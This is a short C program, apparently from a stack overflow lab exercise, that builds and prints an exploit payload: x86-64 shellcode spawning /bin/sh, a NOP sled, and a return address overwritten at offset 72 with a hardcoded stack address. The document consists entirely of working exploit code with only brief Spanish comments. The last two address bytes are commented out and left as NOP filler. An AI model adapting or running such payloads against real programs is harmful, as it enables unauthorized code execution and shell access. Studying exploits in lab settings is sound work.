#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main() {

    unsigned char shellcode[] =
        "\x48\x31\xf6\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
        "\x48\xc1\xeb\x08\x53\x48\x89\xe7\xb0\x3b\x0f\x05";

    size_t shellcode_len = sizeof(shellcode) - 1; // 
    size_t total_size = 80;  // 64 (buffer) + 8 (RBP) + 8 (RIP)

    unsigned char payload[total_size];
    memset(payload, 0x90, total_size); // Relleno con NOP sled

    memcpy(payload, shellcode, shellcode_len);

    // Mi buffer empieza en 7fffffffdcb0
    payload[72] = 0xb0;
    payload[73] = 0xdc;
    payload[74] = 0xff;
    payload[75] = 0xff;
    payload[76] = 0xff;
    payload[77] = 0x7f;
  //  payload[78] = 0x00;
  //  payload[79] = 0x00;

    fwrite(payload, 1, total_size, stdout);

    return 0;
}

